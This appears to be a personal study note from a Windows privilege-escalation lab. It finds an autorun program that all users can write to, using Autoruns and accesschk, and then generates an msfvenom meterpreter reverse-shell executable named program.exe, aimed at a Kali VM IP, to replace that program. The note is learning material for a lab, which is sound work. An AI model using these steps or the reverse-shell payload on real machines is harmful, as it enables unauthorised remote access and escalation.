#winpriv #windows

autorun64.exe will help us find exe that starts or gets execute on boot or login

1. Open command prompt and type: **C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe**

2. In Autoruns, click on the ‘Logon’ tab.  
3. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.  
4. In command prompt type: **C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"  
5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.

6. Open an additional command prompt and type: **msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe  
7. Copy the generated file, program.exe, to the Windows VM.



```

C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe

C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"

msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe

```

